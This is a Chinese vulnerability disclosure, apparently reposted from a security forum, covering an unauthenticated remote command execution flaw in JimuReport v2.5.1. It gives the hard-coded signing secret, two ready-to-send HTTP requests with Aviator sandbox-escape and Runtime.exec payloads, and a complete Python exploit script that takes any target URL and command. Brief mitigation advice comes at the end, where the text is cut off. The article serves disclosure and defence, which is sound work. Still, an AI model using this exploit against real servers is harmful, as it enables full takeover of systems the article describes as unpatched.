#  JeecgBoot 积木报表 v2.5.1 未授权 RCE & Aviator 沙箱逃逸  
rockmelodies
                    rockmelodies  神农Sec   2026-09-14 01:00  
  
  课程培训  
  
  扫码咨询  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
#   
  
专注于SRC漏洞挖掘、红蓝对抗、渗透测试、代码审计JS逆向，CNVD和EDUSRC漏洞挖掘，以及工具分享、前沿信息分享、POC、EXP分享。不定期分享各种好玩的项目及好用的工具，欢迎关注。加内部圈子，文末有彩蛋（课程培训限时优惠）。  
#   
  
文章作者：  
rockmelodies  
  
文章来源：  
https://xz.aliyun.com/news/92789  
  
01  
  
0x1 JeecgBoot 积木报表 v2.5.1 未授权 RCE & Aviator 沙箱逃逸  
  
## 1. 产品介绍（Product Introduction）  
  
JimuReport（积木报表）是 JeecgBoot 团队推出的一款基于低代码技术的智能报表平台，提供灵活的数据可视化设计、多数据源连接、动态模板生成、参数化配置、复杂计算公式、数据权限控制及多格式导出等功能，支持快速构建可配置的业务报表与分析场景。该产品通过 jimureport-spring-boot-starter  
 系列依赖被大量 Spring Boot 业务系统集成，广泛部署于政务、金融、企业信息化等场景，且报表服务默认对外提供 HTTP 接口。本次漏洞位于其自动导出（auto export）功能模块的 /jmreport/auto/export/python/plugin  
 接口及其底层表达式解析引擎（Aviator）。  
## 2. 漏洞标题（Vulnerability Title）  
  
JeecgBoot JimuReport v2.5.1 存在未授权远程命令执行漏洞（pre-auth RCE，Aviator 沙箱逃逸）  
## 3. 漏洞描述（Description）  
  
JimuReport v2.5.1 的自动导出接口 POST /jmreport/auto/export/python/plugin  
 同时标注了 @JimuNoLoginRequired  
（无需登录）与 @JimuSignature  
（需要签名），但其签名密钥 PRINT_PLUGIN_SIGN_SECRET  
 为**硬编码**  
常量，任何人都可伪造 X-Sign = MD5(请求体 + 密钥)  
 通过签名校验，从而在**无需任何认证**  
的情况下触达该接口。该接口将请求体 reportParams[].params  
 中的查询参数值透传至 ExpressUtil.a(value, null)  
，交给 Aviator 表达式引擎执行其中以 =  
 开头的表达式。Aviator 引擎虽关闭了部分反射特性（NewInstance/Use/Module/StaticMethods/StaticFields，并清空 ALLOWED_CLASS_SET），但仍暴露内置变量 __instance__  
、__env__  
 与 seq  
，攻击者据此可将引擎的 functionMissing  
 替换为 JavaMethodReflectionFunctionMissing  
 并重新启用反射 Feature，从而绕过沙箱，最终通过 Runtime.getRuntime().exec(...)  
 在服务器上执行任意系统命令，导致机密性、完整性、可用性全部受损（完整远程代码执行）。  
## 4. 漏洞分析（Analysis / 根因定位）  
  
**根因类型**  
：CWE-94（代码注入 / 表达式注入），辅助成因 CWE-798（硬编码凭据）、CWE-306（关键功能缺少鉴权）。  
  
**数据流 / 触发路径**  
：  
```
攻击者构造 JSON 请求体 reportParams[].params.p = "=<Aviator 表达式>"
  → POST /jmreport/auto/export/python/plugin  (@JimuSignature + @JimuNoLoginRequired)
  → JimuReportSignatureInterceptor.preHandle  (X-Sign = MD5(body + 硬编码密钥) 可伪造 → 通过)
  → JimuReportTokenInterceptor  (@JimuNoLoginRequired → 跳过登录)
  → IJimuReportAutoService.autoExport(vo)
  → autoAsyncTasks.a(vo)  (同步导出)
  → IJmReportExportService.exportMore(exportParams, ...)
  → JmReportBaseServiceImpl.getBaseSql(jmReportDb, paramJson, sqlParamsMap, dbParamType)
  → for (key : queryJson.keySet())  value = ExpressUtil.a(value, null)   ← 危险函数（eval）
  → AviatorEvaluatorInstance.compile(expression).execute(env)  ← 表达式引擎执行
  → 沙箱逃逸 → JavaMethodReflectionFunctionMissing → Runtime.getRuntime().exec(cmd)

```  
  
**代码定位（反编译自**jimureport-spring-boot4-starter-2.5.1.jar**）**  
：  
```
文件：org/jeecg/modules/jmreport/common/interceptor/JimuReportSignatureInterceptor.java
行号：50  （硬编码密钥）
关键代码：
    private static final String PRINT_PLUGIN_SIGN_SECRET = "6fea20a1940df21797d89f09c9111d56c1fe1fcfbe41a121";
    ...
    // 第 72~80 行：针对 /auto/export/python/plugin 直接用该硬编码密钥校验签名
    if (requestUri.endsWith("/auto/export/python/plugin")) {
        String body = requestWrapper.getBody();
        String signValue = DigestUtils.md5DigestAsHex((body + PRINT_PLUGIN_SIGN_SECRET).getBytes("UTF-8")).toUpperCase();
        if (!signValue.equals(headerSign)) { ... return false; }
        return true;
    }
文件：org/jeecg/modules/jmreport/automate/b/a.java  （控制器，混淆后类名）
行号：74~83  （/export/python/plugin 映射）
关键代码：
    @JimuSignature
    @JimuNoLoginRequired
    @RequestMapping(value={"/export/python/plugin"}, method={RequestMethod.POST})
    public Result<?> b(@RequestBody JimuReportAutoExportVO jimuReportAutoExportVO) {
        ...
        return this.jimuReportAutoService.autoExport(jimuReportAutoExportVO);
    }
文件：org/jeecg/modules/jmreport/desreport/service/a/g.java  （getBaseSql）
行号：3362~3367  （RCE 汇聚点）
关键代码：
    for (String key : queryJson.keySet()) {
        String value = queryJson.getString(key);
        if (OkConvertUtils.isEmpty(value)) value = "";
        value = ExpressUtil.a(value, null);   // ← 用户可控值进入表达式引擎
        paramMap.put(key, value);
        ...
    }
文件：org/jeecg/modules/jmreport/desreport/express/ExpressUtil.java
行号：591~610  （eval 实现）
关键代码：
    public static String a(String expression, Map<String,Object> systemParam) {
        ...
        if ((expression = expression.trim()).startsWith("=")) {
            String temp = expression.replace("=", "");
            ...
            Expression exp = i.compile(temp, true);
            Object object = exp.execute(new HashMap(5));   // ← Aviator eval
            return object.toString();
        }
        ...
    }

```  
  
**成因分析**  
：  
1. **签名形同虚设（CWE-798）**  
：/auto/export/python/plugin  
 走“打印插件导出”专用分支，其签名密钥 PRINT_PLUGIN_SIGN_SECRET  
 直接硬编码在客户端依赖中，与服务端配置项 jeecg.jmreport.signatureSecret  
 无关。由于密钥对所有人公开，X-Sign  
 可被任意伪造，@JimuSignature  
 无法提供任何防护。  
  
1. **接口未鉴权（CWE-306）**  
：该接口被 @JimuNoLoginRequired  
 标注，配合可伪造的签名，实际形成完全未授权的访问入口。  
  
1. **表达式注入（CWE-94，根因）**  
：getBaseSql  
 把用户可控的 queryParam 值直接传入 ExpressUtil.a  
 并用 Aviator 动态执行。ExpressUtil.a(engine)  
 虽移除了 NewInstance  
/Use  
/Module  
/StaticMethods  
/StaticFields  
 并清空 ALLOWED_CLASS_SET  
，但**保留了 Aviator 的**InternalVars**Feature**  
，使表达式得以读取 __instance__  
（引擎实例）与 __env__  
（执行环境）这两个内部变量；再配合始终可用的内置 seq  
 函数与已启用的 ForLoop  
（对 __instance__.features  
 遍历取值），即可直接改写引擎的 features  
（重新加入 StaticMethods  
/Fn  
）与 functionMissing  
（替换为 JavaMethodReflectionFunctionMissing  
），导致沙箱被结构性绕过。  
  
## 5. 影响版本（Affected Versions）  
- **受影响版本**  
：v2.5.1（Maven 依赖 org.jeecgframework.jimureport:jimureport-spring-boot4-starter:2.5.1  
）及可能更早版本（该硬编码密钥与 ExpressUtil  
 动态表达式执行在更早版本即存在）。  
  
- **不受影响版本**  
：截至报告日期暂无确认的不受影响版本。  
  
- **修复版本**  
：截至报告日期（2026-09-06）官方仓库最新提交未见修复，暂无修复版本。  
  
- **验证环境**  
：JimuReport v2.5.1（git commit 414017d  
）/ Windows 11 / Spring Boot 4.1.0 / JDK 21 / MySQL 8.0.12 / Redis 5.0.14。  
  
## 6. 漏洞等级（Severity）  
  
<table><thead><tr><th style="color: rgb(89, 89, 89);font-size: 15px;line-height: 1.5em;letter-spacing: 0.04em;text-align: left;font-weight: bold;background: none left top / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">项目</span></span></section></th><th style="color: rgb(89, 89, 89);font-size: 15px;line-height: 1.5em;letter-spacing: 0.04em;text-align: left;font-weight: bold;background: none left top / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">值</span></span></section></th></tr></thead><tbody><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">CVSS v3.1 分数</span></span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">9.8</span></span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">CVSS v3.1 向量</span></span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><code><span leaf=""><span textstyle="" style="font-size: 14px;">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</span></span></code></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">CVSS v4.0 分数</span></span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">9.3</span></span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">CVSS v4.0 向量</span></span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><code><span leaf=""><span textstyle="" style="font-size: 14px;">CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N</span></span></code></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">危害等级</span></span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">严重（Critical）</span></span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">对应目标库等级</span></span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">CNVD 高危 / CNNVD 高危</span></span></section></td></tr></tbody></table>  
  
评分依据：无需认证（PR:N）、网络可达（AV:N）、无需用户交互（UI:N）、攻击复杂度低（AC:L）、可直接远程执行任意命令（C/I/A 全 High）。  
## 7. CVSS 向量（CVSS Vector）  
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N

```  
## 8. 漏洞复现过程（Reproduction Steps）  
### 8.1 复现环境  
- 产品/版本：JimuReport v2.5.1（jimureport-example  
，依赖 jimureport-spring-boot4-starter:2.5.1  
）  
  
- 系统/运行时：Windows 11 / JDK 21 / Spring Boot 4.1.0 / MySQL 8.0.12 / Redis 5.0.14  
  
- 网络位置：本地自建靶标 http://127.0.0.1:8090  
  
- 测试账号：无（未登录，未携带任何 Token）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QVwCia5dv649skzRqxqyHZ4lJCNIBPVbY7PepOy3Ty86Lgn7jg0yAPnyO4SOCibDK72XfIQjtiaUxaYsBUozy28fSmrBhhWrPy8fM/640?wx_fmt=png&from=appmsg "")  
  
  
```
<font style="color:rgb(8, 8, 8);background-color:rgba(212, 222, 231, 0.247);">默认账号密码：admin / 123456，</font>[<font style="color:rgb(49, 95, 189);">支持改密码</font>](https://help.jimureport.com/qa?_highlight=%E5%AF%86%E7%A0%81#4-jimureport-example%E9%A1%B9%E7%9B%AE%E6%80%8E%E4%B9%88%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81)

```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QV4FTmYXtM1swBCbzMG7cMtxEWCHyCpRyMe6sUcunApibQic9Se6mlAB23d77c3t4xzKyviaSTia9W4scic4jwjnuyVicuTzxG07njQE/640?wx_fmt=png&from=appmsg "")  
  
### 8.2 复现步骤  
  
**步骤 1 — 环境准备**  
  
切换到 v2.5.1 版本源码并启动项目：  
```
git checkout -b v2.5.1 414017d   # v2.5.1 版本发布提交
# 导入数据库：db/jimureport.mysql5.7.create.sql -> 库名 jimureport
# 修改 application-dev.yml: 端口 8090、MySQL 密码、开启 automate.export.enable-auto-export=true
mvn -DskipTests package
java -jar jimureport-example-2.5.jar

```  
  
启动日志：Started JimuReportApplication in 13.085 seconds  
，Tomcat started on port 8090  
，HikariPool 成功连接 MySQL。  
  
证据：应用启动成功、MySQL 数据源连通；未登录状态直接访问接口可返回导出结果。  
  
**步骤 2 — 构造恶意请求（STEP1 沙箱逃逸）**  
  
利用硬编码密钥 6fea20a1940df21797d89f09c9111d56c1fe1fcfbe41a121  
 伪造签名 X-Sign = MD5(body + secret).upper()  
：  
```
POST /jmreport/auto/export/python/plugin HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/json
X-Timestamp: 1788705518570
X-Sign: 4AECF57779F94731EF7A0ADA7520EDF8
User-Agent: poc/1.0

{"reportParams":[{"id":"891612623430320128","params":{"p":"=for x in __instance__.features { seq.put(__instance__.funcMap, '_sm', x.declaringClass.enumConstants[16]); seq.put(__instance__.funcMap, '_fn', x.declaringClass.enumConstants[8]) }; seq.add(__instance__.features, seq.get(__instance__.funcMap, '_sm')); seq.add(__instance__.features, seq.get(__instance__.funcMap, '_fn')); seq.put(__env__, 'c', __instance__.Class); seq.put(__env__, 'CC', c.Class); seq.put(__env__, 'FM', CC.forName('com.googlecode.aviator.runtime.JavaMethodReflectionFunctionMissing')); seq.put(__env__, 'RF', CC.forName('com.googlecode.aviator.utils.Reflector')); RF.setProperty(__env__, '__instance__.functionMissing', FM.getInstance()) * 1*4831927"},"exportType":"PDF"}],"exportType":"PDF"}

```  
  
**步骤 3 — 触发漏洞 / 观察结果（STEP2 命令执行）**  
```
POST /jmreport/auto/export/python/plugin HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/json
X-Timestamp: 1788705524387
X-Sign: 0C46248431632CA04F0098C6B9DD11E2
User-Agent: poc/1.0

{"reportParams":[{"id":"891612623430320128","params":{"p":"=seq.put(__env__, 'c', __instance__.Class); seq.put(__env__, 'CC', c.Class); seq.put(__env__, 'RT', CC.forName('java.lang.Runtime')); seq.put(__env__, 'r', RT.getRuntime()); exec(seq.get(__env__, 'r'), 'cmd.exe /c echo JimuReport_PWNED > F:/data/github/JimuReport/vuln-reproduction/pwned.txt') * 1*4831927"},"exportType":"PDF"}],"exportType":"PDF"}

```  
  
两次请求均返回 HTTP 200  
，Content-Type: application/octet-stream;charset=UTF-8  
，响应体以 PK\x03\x04  
（ZIP）开头，说明伪造签名被接受、接口未鉴权、导出流程（含 eval）被执行。  
  
**步骤 4 — 影响验证**  
```
$ cat F:/data/github/JimuReport/vuln-reproduction/pwned.txt
JimuReport_PWNED

```  
  
命令 cmd.exe /c echo JimuReport_PWNED > ...  
 已在服务器上真实执行并落盘，证明完整的未授权远程命令执行成立。  
  
证据：  
- HTTP 200 + application/octet-stream  
 + PK  
 魔数（两次请求响应）  
  
- pwned.txt  
 文件生成，内容 JimuReport_PWNED  
  
- 应用日志 JimuReportTokenServiceImpl  
 记录 RequestPath=/jmreport/auto/export/python/plugin  
，Token=null  
（未登录即处理）  
  
## 9. 漏洞复现 POC（Proof of Concept）  
### 9.1 使用说明  
- 运行环境：Python 3（独立脚本 reproduce_rce.py  
）、pocsuite3 插件、Nuclei 模板  
  
- 依赖：标准库 urllib  
（无需第三方库）；pocsuite3 插件需 pocsuite3  
  
- 安全声明：本 POC 仅用于授权测试与漏洞验证，禁止用于未授权系统；默认命令为非破坏性的文件写入/whoami  
，不包含反弹 shell、勒索、持久化或横向移动逻辑。  
  
### 9.2 POC 代码（核心片段）  
```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""JimuReport 2.5.1  pre-auth RCE 复现脚本（本机验证版）========================================================================漏洞链: POST /jmreport/auto/export/python/plugin  (@JimuSignature + @JimuNoLoginRequired)        -> JimuReportAutoService.autoExport -> autoAsyncTasks(同步) -> exportMore        -> getBaseSql -> ExpressUtil.a(queryParam 值) -> Aviator eval -> 沙箱逃逸 -> Runtime.exec签名: X-Sign = MD5(原始请求体 + PRINT_PLUGIN_SIGN_SECRET).upper()      内置硬编码密钥 PRINT_PLUGIN_SIGN_SECRET = 6fea20a1940df21797d89f09c9111d56c1fe1fcfbe41a121用法:  python reproduce_rce.py <target> "<command>"  例(写文件验证): python reproduce_rce.py http://127.0.0.1:8090 "cmd.exe /c echo PWNED > F:/data/github/JimuReport/vuln-reproduction/pwned.txt"  例(弹计算器):   python reproduce_rce.py http://127.0.0.1:8090 "cmd.exe /c calc.exe""""
import hashlib
import json
import sys
import time
import random
import urllib.request
import urllib.error

SECRET = "6fea20a1940df21797d89f09c9111d56c1fe1fcfbe41a121"
ENDPOINT = "/jmreport/auto/export/python/plugin"
DEFAULT_REPORT_ID = "891612623430320128"


def build_step1_body(report_id: str) -> str:
    """STEP1 沙箱逃逸(持久化): 把 Aviator 引擎的 functionMissing 替换为    JavaMethodReflectionFunctionMissing, 并重新启用反射相关 Feature。"""
    expr = (
        "=for x in __instance__.features { "
        "seq.put(__instance__.funcMap, '_sm', x.declaringClass.enumConstants[16]); "
        "seq.put(__instance__.funcMap, '_fn', x.declaringClass.enumConstants[8]) }; "
        "seq.add(__instance__.features, seq.get(__instance__.funcMap, '_sm')); "
        "seq.add(__instance__.features, seq.get(__instance__.funcMap, '_fn')); "
        "seq.put(__env__, 'c', __instance__.Class); "
        "seq.put(__env__, 'CC', c.Class); "
        "seq.put(__env__, 'FM', CC.forName('com.googlecode.aviator.runtime.JavaMethodReflectionFunctionMissing')); "
        "seq.put(__env__, 'RF', CC.forName('com.googlecode.aviator.utils.Reflector')); "
        "RF.setProperty(__env__, '__instance__.functionMissing', FM.getInstance()) * 1*%d"
    ) % (int(time.time() * 1000) % 1000000,)
    return json.dumps(
        {"reportParams": [{"id": report_id, "params": {"p": expr}, "exportType": "PDF"}],
         "exportType": "PDF"},
        separators=(",", ":"), ensure_ascii=False)


def build_step2_body(cmd: str, report_id: str) -> str:
    """STEP2 命令执行: exec(r, cmd) -> Runtime.exec(String)。"""
    safe_cmd = cmd.replace("\\", "\\\\").replace("'", "\\'")
    expr = (
        "=seq.put(__env__, 'c', __instance__.Class); "
        "seq.put(__env__, 'CC', c.Class); "
        "seq.put(__env__, 'RT', CC.forName('java.lang.Runtime')); "
        "seq.put(__env__, 'r', RT.getRuntime()); "
        "exec(seq.get(__env__, 'r'), '%s') * 1*%d"
    ) % (safe_cmd, random.getrandbits(24))
    return json.dumps(
        {"reportParams": [{"id": report_id, "params": {"p": expr}, "exportType": "PDF"}],
         "exportType": "PDF"},
        separators=(",", ":"), ensure_ascii=False)


def send(target: str, body: str, tag: str) -> None:
    ts = str(int(time.time() * 1000))
    sign = hashlib.md5((body + SECRET).encode()).hexdigest().upper()
    req = urllib.request.Request(
        target + ENDPOINT,
        data=body.encode("utf-8"),
        headers={
            "Content-Type": "application/json",
            "X-Timestamp": ts,
            "X-Sign": sign,
            "User-Agent": "poc/1.0",
        },
        method="POST",
    )
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    print("=" * 72)
    print("[%s] POST %s%s" % (tag, target, ENDPOINT))
    print("X-Timestamp: %s" % ts)
    print("X-Sign    : %s" % sign)
    print("Body(%d): %s%s" % (len(body), body[:140], "..." if len(body) > 140 else ""))
    try:
        with opener.open(req, timeout=40) as resp:
            data = resp.read()
            ctype = resp.headers.get("Content-Type", "")
            print("HTTP %s | %s | %d bytes" % (resp.status, ctype, len(data)))
            if "json" in ctype or "text" in ctype:
                print("Resp: %s" % data.decode("utf-8", errors="replace")[:400])
            else:
                print("Resp: (binary %d bytes, magic=%s)" % (len(data), data[:4].hex()))
    except urllib.error.HTTPError as e:
        data = e.read().decode("utf-8", errors="replace")
        print("HTTP %s" % e.code)
        print("Resp: %s" % data[:400])
    except Exception as e:
        print("ERR : %s" % e)


def main():
    args = sys.argv[1:]
    if not args:
        print(__doc__)
        sys.exit(1)
    target = args[0].rstrip("/")
    cmd = args[1] if len(args) > 1 else "cmd.exe /c calc.exe"
    report_id = DEFAULT_REPORT_ID

    print("Target : %s" % target)
    print("Command: %s" % cmd)
    print("ReportID: %s" % report_id)
    print()

    print("[*] STEP 1: 沙箱逃逸 (持久化在 JVM 内, 幂等)")
    send(target, build_step1_body(report_id), "STEP1")
    print()
    time.sleep(1)

    print("[*] STEP 2: 命令执行 Runtime.exec(String)")
    send(target, build_step2_body(cmd, report_id), "STEP2")
    print()
    print("[*] done. HTTP 200/500 均可能, 以命令副作用为准(写盘文件/弹窗/带外)。")


if __name__ == "__main__":
    main()

```  
  
完整可运行脚本见 poc/reproduce_rce.py  
（独立版）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QWVMD18cZ3YtEtegPgzJrh0yvny0EKBbkpHXh1Uzkqr3g5eOPTib7G0xw9m5zzXMuhAlib6jjsCSa0Yn4aPbfIXZMs6n6ZdwDx60/640?wx_fmt=png&from=appmsg "")  
  
## 10. 修复建议（Fix Recommendations）  
### 10.1 临时缓解措施  
- 在 WAF/网关层对 /jmreport/auto/export/**  
 实施访问控制（IP 白名单 / 仅内网可达）。  
  
- 若业务不使用“打印插件导出”，临时下线或屏蔽 /jmreport/auto/export/python/plugin  
 与 /jmreport/auto/export/plugin  
 接口。  
  
- 关闭 jeecg.jmreport.automate.export.enable-auto-export  
，阻止自动导出链路。  
  
### 10.2 根治修复方案  
1. **去除硬编码密钥**  
：JimuReportSignatureInterceptor  
